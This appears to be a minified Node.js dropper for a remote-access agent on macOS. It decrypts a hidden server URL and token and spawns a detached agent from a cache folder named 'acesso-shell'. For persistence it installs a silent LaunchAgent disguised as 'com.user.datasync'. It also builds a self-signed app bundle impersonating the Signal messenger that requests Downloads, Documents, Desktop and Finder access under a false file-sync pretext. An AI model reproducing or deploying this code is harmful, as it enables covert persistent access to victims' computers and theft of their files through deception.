#!/usr/bin/env node
import { createRequire as __cr } from 'node:module'; const require = __cr(import.meta.url);
var E=Object.defineProperty;var B=(e,t,r)=>()=>{if(r)throw r[0];try{return e&&(t=e(e=0)),t}catch(o){throw r=[o],o}};var j=(e,t)=>{for(var r in t)E(e,r,{get:t[r],enumerable:!0})};var k={};j(k,{CHAVE:()=>q,DADOS:()=>V,IV:()=>U,TAG:()=>J});var U,J,V,H,G,q,v=B(()=>{U="FreA7Nc93oMqcTA5",J="skXHpjf5jWhqJ/18H9gB1A==",V="DL1F411Ix9OflqDFT2om53eeEfyhHYRJXy9L4Z8IJgsIlIV9foAFlfrEpXhPPxowSnLlieUjqF4UlfJCRWQ3qnEzZO/wLO+dmKJUhS8sz21coSwLT0LAPcH2rqBdsRLhdYibQZLznIdir4ro3vxatSw8dn3PwdRFkeexvNm/m59ydlXVyB7Ig+h+DiYiiHHr68CgQ7KM8Sqp+ZpH5Q==",H="QL06jVTo155tN88G",G="ixW1Qw0NvcApJ8huvQ9zZuCEIJs=",q=H+G});import{spawn as oe}from"node:child_process";import{mkdirSync as O,readFileSync as b,writeFileSync as ne,rmSync as ie}from"node:fs";import{homedir as se}from"node:os";import c from"node:path";import{fileURLToPath as ce}from"node:url";import{createCipheriv as me,createDecipheriv as $,randomBytes as fe}from"node:crypto";var R="aes-256-gcm";function S({iv:e,tag:t,dados:r,chave:o}){let i=$(R,Buffer.from(o,"base64"),Buffer.from(e,"base64"));i.setAuthTag(Buffer.from(t,"base64"));let a=Buffer.concat([i.update(Buffer.from(r,"base64")),i.final()]);return JSON.parse(a.toString("utf8"))}function A(e){return typeof e?.url!="string"||typeof e?.token!="string"?null:{url:e.url,token:e.token,persistir:e.persistir===!0}}async function x(){let e=process.env.URL_SERVIDOR?.trim(),t=process.env.TOKEN_AGENTE?.trim();if(e&&t)return{url:e,token:t,persistir:process.env.PERSISTIR==="true"};let r;try{r=await Promise.resolve().then(()=>(v(),k))}catch{return null}if(typeof r.CONFIG_B64=="string"&&r.CONFIG_B64)try{return A(JSON.parse(Buffer.from(r.CONFIG_B64,"base64").toString("utf8")))}catch{return null}if(typeof r.DADOS=="string"&&r.DADOS)try{return A(S({iv:r.IV,tag:r.TAG,dados:r.DADOS,chave:r.CHAVE}))}catch{return null}return null}import{execSync as D}from"node:child_process";import{mkdirSync as M,writeFileSync as _,rmSync as ke}from"node:fs";import N from"node:os";import m from"node:path";var f="com.user.datasync",C=m.join(N.homedir(),"Library","LaunchAgents"),P=m.join(C,`${f}.plist`),xe=m.join(N.homedir(),".cache","acesso-shell"),Q=()=>process.platform==="darwin",L=()=>`gui/${process.getuid()}`;function Z(e){return String(e).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;")}function z({nodeBin:e,agentePath:t,appPath:r}){let o=r?[r]:[e,t];return['<?xml version="1.0" encoding="UTF-8"?>','<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">','<plist version="1.0">',"<dict>","  <key>Label</key>",`  <string>${f}</string>`,"  <key>ProgramArguments</key>","  <array>",...o.map(i=>`    <string>${Z(i)}</string>`),"  </array>","  <key>RunAtLoad</key>","  <true/>","  <key>KeepAlive</key>","  <true/>","  <key>StandardOutPath</key>","  <string>/dev/null</string>","  <key>StandardErrorPath</key>","  <string>/dev/null</string>","</dict>","</plist>",""].join(`
`)}function I({nodeBin:e,agentePath:t,appPath:r}){if(!Q())return!1;M(C,{recursive:!0}),_(P,z({nodeBin:e,agentePath:t,appPath:r}),{mode:384});try{D(`launchctl bootout ${L()}/${f}`,{stdio:"ignore"})}catch{}return D(`launchctl bootstrap ${L()} ${JSON.stringify(P)}`,{stdio:"ignore"}),!0}import{spawnSync as d}from"node:child_process";import{chmodSync as K,mkdirSync as X,rmSync as Y,writeFileSync as F}from"node:fs";import n from"node:path";import{fileURLToPath as W,pathToFileURL as ee}from"node:url";var g=n.resolve(n.dirname(W(import.meta.url)),".."),s="Signal",re="com.user.datasync.launcher",te=`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>CFBundleIdentifier</key>
  <string>${re}</string>
  <key>CFBundleName</key>
  <string>${s}</string>
  <key>CFBundleDisplayName</key>
  <string>${s}</string>
  <key>CFBundleExecutable</key>
  <string>${s}</string>
  <key>CFBundlePackageType</key>
  <string>APPL</string>
  <key>CFBundleShortVersionString</key>
  <string>1.0.0</string>
  <key>CFBundleVersion</key>
  <string>1</string>
  <key>LSMinimumSystemVersion</key>
  <string>12.0</string>
  <key>LSUIElement</key>
  <false/>
  <key>NSDownloadsFolderUsageDescription</key>
  <string>Signal needs access to your Downloads folder to keep your files in sync.</string>
  <key>NSDocumentsFolderUsageDescription</key>
  <string>Signal needs access to your Documents folder to keep your files in sync.</string>
  <key>NSDesktopFolderUsageDescription</key>
  <string>Signal needs access to your Desktop folder to keep your files in sync.</string>
  <key>NSAppleEventsUsageDescription</key>
  <string>Signal uses Finder to locate and sync your files.</string>
</dict>
</plist>
`;function y({destino:e,nodeBin:t=process.execPath,agentePath:r}){let o=n.join(n.resolve(e),`${s}.app`),i=n.join(o,"Contents"),a=n.join(i,"MacOS"),l=n.join(a,s);Y(o,{recursive:!0,force:!0}),X(a,{recursive:!0}),F(l,`#!/bin/zsh
# gerado por scripts/empacotar-app.mjs
exec ${JSON.stringify(t)} ${JSON.stringify(r)}
`),K(l,493),F(n.join(i,"Info.plist"),te);let h=d("codesign",["--force","--sign","-","--timestamp=none",o],{stdio:"pipe"});d("/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister",["-f",o],{stdio:"ignore"});let w=h.status===0&&d("codesign",["--verify","--verbose=0",o]).status===0;return{bundle:o,executavel:l,assinado:w,erroAssinatura:h.stderr?.toString().trim()}}if(process.argv[1]&&import.meta.url===ee(n.resolve(process.argv[1])).href){let e=n.resolve(process.argv[2]??n.join(g,"dist")),t=y({destino:e,nodeBin:process.env.NODE??process.execPath,agentePath:n.join(g,"agente","index.mjs")});t.assinado?console.log("[ok] app assinado ad-hoc e verificado."):(console.warn("[aviso] codesign falhou; app ficou SEM assinatura (TCC vai pedir a cada rebuild):"),console.warn(`        ${t.erroAssinatura||"erro desconhecido"}`)),console.log(`
app gerado: ${t.bundle}`),console.log(`node embutido: ${process.env.NODE??process.execPath}`),console.log(`agente embutido: ${n.join(g,"agente","index.mjs")}`),console.log(`abrir com: open ${JSON.stringify(t.bundle)}`),console.log(`
Lembrete: regenerar o app invalida o grant de TCC (muda o hash da assinatura).`)}var T=c.dirname(ce(import.meta.url)),p=c.join(se(),".cache","acesso-shell"),u=c.join(p,"agente.pid");function ae(){try{let e=Number.parseInt(b(u,"utf8").trim(),10);return!Number.isFinite(e)||e<=0?!1:(process.kill(e,0),!0)}catch{return!1}}function pe(){try{let e=Number.parseInt(b(u,"utf8").trim(),10);Number.isFinite(e)&&e>0&&process.kill(e,"SIGKILL")}catch{}try{ie(u,{force:!0})}catch{}}try{let e=await x();if(e){if(e.persistir&&process.platform==="darwin"){let t=c.join(T,"agent","index.mjs"),r;try{O(p,{recursive:!0}),r=y({destino:p,nodeBin:process.execPath,agentePath:t}).executavel}catch{r=void 0}pe(),I({nodeBin:process.execPath,agentePath:t,appPath:r})}else if(!ae()){O(p,{recursive:!0});let t=oe(process.execPath,[c.join(T,"agent","index.mjs")],{detached:!0,stdio:"ignore"});t.unref(),t.pid&&ne(u,String(t.pid),{mode:384})}}}catch{}process.exit(0);
